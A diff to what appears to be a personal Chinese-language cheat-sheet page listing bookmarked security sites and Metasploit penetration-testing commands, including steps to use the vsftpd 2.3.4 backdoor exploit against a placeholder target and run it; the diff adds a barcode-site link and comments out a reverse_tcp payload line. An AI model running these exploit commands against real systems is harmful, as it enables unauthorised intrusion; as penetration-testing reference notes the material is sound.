@@ -25,14 +25,15 @@
   </ul>
 
   <script>
-    // 示例数据
     var allResults = [
-        //收藏的网站
+       //收藏的网站
       { command: 'https://mogua.co/', description: '“摸瓜，取自顺藤摸瓜，比喻沿着发现的线索追究根底。”可疑APP查验网站'},
       { command: 'https://www.yuque.com/again-719bb/pfhi8f/gbe4ms53sp3m1mpt', description: '“小T的文章学习'},
       { command: 'https://cybermap.kaspersky.com/cn', description: '“卡巴斯基实时网络威胁地图'},      
       { command: 'https://ssa.yundun.com/cc', description: '“云盾实时网络威胁地图'},
-
+      //条形码生成网站
+      { command: 'https://www.kw360.net/barcode/', description: '“条形码生成网站'},
+      
 
       //metasploit下的命令
       { command: 'msfdb reinit', description: '“重置数据库-metasploit'},
@@ -175,7 +176,7 @@
       { command: 'run', description: '执行渗透-window10-1903渗透测试' },     
       //vsftpd_234版本漏洞渗透测试
       { command: 'use exploit/unix/ftp/vsftpd_234_backdoor', description: '设置漏洞利用模块-vsftpd_2.3.4渗透测试' },
-      { command: 'set payload windows/x64/shell/reverse_tcp', description: '设置攻击载荷模块-vsftpd_2.3.4渗透测试' },
+      // command: 'set payload windows/x64/shell/reverse_tcp', description: '设置攻击载荷模块-vsftpd_2.3.4渗透测试' },
       { command: 'set RHOSTS #IP#', description: '设置攻击模块-vsftpd_2.3.4渗透测试' },
       { command: 'run', description: '执行渗透-vsftpd_2.3.4渗透测试' },
       //系统枚举渗透测试
